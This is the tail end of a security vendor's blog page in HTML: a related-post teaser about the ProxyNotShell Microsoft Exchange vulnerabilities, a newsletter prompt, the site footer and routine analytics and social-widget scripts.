    <a href="https://www.cybereason.com/blog/threat-alert-proxynotshell-two-critical-vulnerabilities-affecting-ms-exchange"><img src="https://www.cybereason.com/hubfs/blog-post-text%20-%202022-10-03T113003.246.png" alt="THREAT ALERT: ProxyNotShell - Two Critical Vulnerabilities Affecting MS Exchange"></a>
    <h4><a href="https://www.cybereason.com/blog/threat-alert-proxynotshell-two-critical-vulnerabilities-affecting-ms-exchange"><span class="underline">THREAT ALERT: ProxyNotShell - Two Critical Vulnerabilities Affecting MS Exchange</span></a></h4>
     <p>The Cybereason GSOC Managed Detection and Response (MDR) Team is investigating incidents that involve exploitation of the critical Microsoft Exchange vulnerabilities (CVE-2022–41040 and CVE-2022–41082) dubbed ProxyNotShell after finding them being exploited in the wild...</p>
   </div>
 </div>



    </div>
  </div>
</section></div>

</div><!--end widget-span -->
</div><!--end row-->
</div><!--end row-wrapper -->

<div class="row-fluid-wrapper row-depth-1 row-number-3 ">
<div class="row-fluid ">
<div class="span12 widget-span widget-type-custom_widget " style="" data-widget-type="custom_widget" data-x="0" data-w="12">
<div id="hs_cos_wrapper_module_161767462015235" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module widget-type-blog_subscribe" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module"><div class="cr-mln__blog-listing-page__subscribe-footer">
  <div class="container container-is-blog columns page-center">
    <div class="column is-8-fullhd is-8-desktop is-10-tablet is-12-mobile">
      <span class="tag">NEWSLETTER</span>
      <h3>Never miss a blog</h3>
      <p>Get the latest research, expert insights, and security industry news.</p>
      <a class="cr-button cr-mln__subscribe" href="#blog-subscribe">Subscribe</a>
    </div>
    <!--<div class="column is-5-fullhd is-5-desktop is-half-tablet is-12-mobile is-offset-1-fullhd is-offset-1-desktop">
      <div class="inputs-wrapper">
        
        
      </div>
    </div>-->
  </div>
</div></div>

</div><!--end widget-span -->
</div><!--end row-->
</div><!--end row-wrapper -->

<div class="row-fluid-wrapper row-depth-1 row-number-4 ">
<div class="row-fluid ">
<div class="span12 widget-span widget-type-custom_widget " style="" data-widget-type="custom_widget" data-x="0" data-w="12">
<div id="hs_cos_wrapper_module_166508001252918" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module"><div class="cr-sticky-cta-bar bg-black" id="sticky-bar">
  <div class="content">
    <span>Want to see the Cybereason Defense Platform in action?</span>
    <a class="cr-button cr-button__fill-yellow" href="https://www.cybereason.com/request-a-demo" target="_blank">Schedule a Demo</a>
  </div>
  <div class="close">X</div>
</div></div>

</div><!--end widget-span -->
</div><!--end row-->
</div><!--end row-wrapper -->

    </div><!--end body -->
</div><!--end body wrapper -->

<div class="footer-container-wrapper">
    <div class="footer-container container-fluid">

<div class="row-fluid-wrapper row-depth-1 row-number-1 ">
<div class="row-fluid ">
<div class="span12 widget-span widget-type-custom_widget " style="" data-widget-type="custom_widget" data-x="0" data-w="12">
<div id="hs_cos_wrapper_module_16036762394194314" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module"><!-- FOOTER -->

<footer class="cr-section cr-footer cr-footer__full">
    <div class="container page-center">
      <div class="columns">
          <div class="column is-6-fullhd is-5-desktop cr-footer__col cr-footer__left">
            <div class="cr-footer__Left-logo">
              
                <a href="https://www.cybereason.com">
                  
                <img src="https://www.cybereason.com/hubfs/dam/images/images-web/logos/cr-brand/cr-logo-inline--primary-white.png">
              </a>
            </div>
          </div>
          <div class="columns column is-6-fullhd is-6-desktop cr-footer__col cr-footer__right">
            <div class="cr-footer__links-list column">
              <h4>About</h4>
              <ul>
                <li><a href="https://www.cybereason.com/company/who-we-are">Who We Are</a>
                </li><li><a href="https://www.cybereason.com/company/careers">Careers</a>
          <!-- </li><li><a href="https://www.cybereason.com/company/leadership">Leadership</a> --->
                </li><li><a href="https://www.cybereason.com/company/contact-us">Contact</a>
              </li></ul>
            </div>
            <div class="cr-footer__links-list column">
              <h4>Resources</h4>
              <ul>
                <li><a href="https://www.cybereason.com/blog">Blog</a></li>
                <li><a href="https://www.cybereason.com/resources/tag/case-study">Case Studies</a></li>
                <li><a href="https://www.cybereason.com/resources/tag/webinars">Webinars</a></li>
                <li><a href="https://www.cybereason.com/resources/tag/white-papers">White Papers</a></li>
             </ul>
            </div>
            <div class="cr-footer__links-list column">
              <h4>Platform</h4>
              <ul>
                
                <li><a href="https://www.cybereason.com/platform">Overview</a></li>
                <li><a href="https://www.cybereason.com/platform/endpoint-prevention">Endpoint Protection</a></li>
                <li><a href="https://www.cybereason.com/platform/endpoint-detection-response-edr">EDR</a></li>
                <li><a href="https://www.cybereason.com/platform/managed-detection-response-mdr">MDR</a></li>
              </ul>
            </div>
          </div>
      </div>
    </div>
  
    <div class="container page-center">
      <div class="columns cr-footer__bottom-bar">
        <div class="column">
          <p>©Cybereason 2025. All Rights Reserved.</p>
        </div>
        <div class="column bottom-bar__links">
          <ul>
            <li><a href="https://www.cybereason.com/terms-of-use">Terms of Use</a></li>
            <li><a href="https://www.cybereason.com/privacy-notice">Privacy Notice</a></li>
            <li><a href="https://www.cybereason.com/ccpa-privacy-request">Do Not Sell</a></li>
            <li><a href="https://www.cybereason.com/security">Security</a></li>
            <!--<li><a href="#">Cookie Policy</a></li>-->
          </ul>
        </div>

        <div class="column bottom-bar__social">
          <ul>
            <li><a class="facebook" href="https://www.facebook.com/Cybereason/"></a></li>
            <li><a class="twitter" href="https://twitter.com/cybereason"></a></li>
            <li><a class="youtube" href="https://www.youtube.com/channel/UCOm7AaB0HiNH4Phe66sK0Ew"></a></li>
            <li><a class="linkedin" href="https://www.linkedin.com/company/cybereason"></a></li>
            <li><a class="instagram" href="https://www.instagram.com/cybereason"></a></li>
          </ul>
        </div>
    </div>
  </div>

</footer></div>

</div><!--end widget-span -->
</div><!--end row-->
</div><!--end row-wrapper -->

    </div><!--end footer -->
</div><!--end footer wrapper -->

    
<!-- HubSpot performance collection script -->
<script defer src="/hs/hsstatic/content-cwv-embed/static-1.1293/embed.js"></script>
<script src="https://www.cybereason.com/hubfs/hub_generated/template_assets/1/42507089303/1741528346196/template_animatedModal.min.js"></script>
<script>
var hsVars = hsVars || {}; hsVars['language'] = 'en';
</script>

<script src="/hs/hsstatic/cos-i18n/static-1.53/bundles/project.js"></script>
<script src="https://www.cybereason.com/hubfs/hub_generated/module_assets/1/41681847227/1741488491170/module_CR_-_Malicious_Life_Network_--_Tier_One_Header.min.js"></script>
<script src="https://www.cybereason.com/hubfs/hub_generated/module_assets/1/41682410610/1741488492472/module_CR_-_Malicious_Life_Network_--_Main_Hero.min.js"></script>
<script src="https://www.cybereason.com/hubfs/hub_generated/module_assets/1/48386556055/1741488537305/module_CR_-_HTML_PopUp_Window_--_IOCs.min.js"></script>
<script src="https://www.cybereason.com/hubfs/hub_generated/module_assets/1/43300360745/1741488505140/module_CR_-_Malicious_Life_Network_--_Related_Posts.min.js"></script>
<script src="https://www.cybereason.com/hubfs/hub_generated/module_assets/1/86933076631/1741488758324/module_CR_-_Sticky_CTA_Bar.min.js"></script>

<!-- Start of HubSpot Analytics Code -->
<script type="text/javascript">
var _hsq = _hsq || [];
_hsq.push(["setContentType", "blog-post"]);
_hsq.push(["setCanonicalUrl", "https:\/\/www.cybereason.com\/blog\/operation-cuckoobees-deep-dive-into-stealthy-winnti-techniques"]);
_hsq.push(["setPageId", "72000117095"]);
_hsq.push(["setContentMetadata", {
    "contentPageId": 72000117095,
    "legacyPageId": "72000117095",
    "contentFolderId": null,
    "contentGroupId": 5272851739,
    "abTestId": null,
    "languageVariantId": 72000117095,
    "languageCode": "en",
    
    
}]);
</script>

<script type="text/javascript" id="hs-script-loader" async defer src="/hs/scriptloader/3354902.js"></script>
<!-- End of HubSpot Analytics Code -->


<script type="text/javascript">
var hsVars = {
    render_id: "a116c496-a816-4e26-94b0-815a91017508",
    ticks: 1758171144595,
    page_id: 72000117095,
    
    content_group_id: 5272851739,
    portal_id: 3354902,
    app_hs_base_url: "https://app.hubspot.com",
    cp_hs_base_url: "https://cp.hubspot.com",
    language: "en",
    analytics_page_type: "blog-post",
    scp_content_type: "",
    
    analytics_page_id: "72000117095",
    category_id: 3,
    folder_id: 0,
    is_hubspot_user: false
}
</script>


<script defer src="/hs/hsstatic/HubspotToolsMenu/static-1.432/js/index.js"></script>

<script>if ($('[id^="hs_form"]').length > 0) {
  var myInterval = setInterval(
  function() {
    var myFields = document.getElementsByClassName('hs-input');
    if (myFields.length > 0) {
      clearInterval(myInterval);
      for (var i = 0; i < myFields.length; i++) {
        var myField = myFields[i];
		var myTagName = myField.tagName.toLowerCase();
        if (myTagName == 'input' || myTagName == 'textarea') {
          if (myField.placeholder != null) {
            myField.placeholder = myField.placeholder.replace('*', '');
          }
        } else if (myTagName == 'select') {
          myField.options[0].innerHTML = myField.options[0].innerHTML.replace('*', '');
        }
      }
    }
  }, 100);
}
</script>

<div id="fb-root"></div>
  <script>(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) return;
  js = d.createElement(s); js.id = id;
  js.src = "//connect.facebook.net/en_GB/sdk.js#xfbml=1&version=v3.0";
  fjs.parentNode.insertBefore(js, fjs);
 }(document, 'script', 'facebook-jssdk'));</script> <script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="https://platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script>
 


    <script>
function sticky_relocate() {
  var window_top = $(window).scrollTop();
  var div_top = $('#sticky-anchor').offset().top;
  if (window_top > div_top) {
    $('#sticky').addClass('stick');
  } else {
    $('#sticky').removeClass('stick');
  }
}

$(function() {
  $(window).scroll(sticky_relocate);
  sticky_relocate();
});
</script>
    <!-- Generated by the HubSpot Template Builder - template version 1.03 -->

<script type="text/javascript" src="/_Incapsula_Resource?SWJIYLWA=719d34d31c8e3a6e6fffd425f7e032f3&ns=3&cb=666202623" async></script></body></html>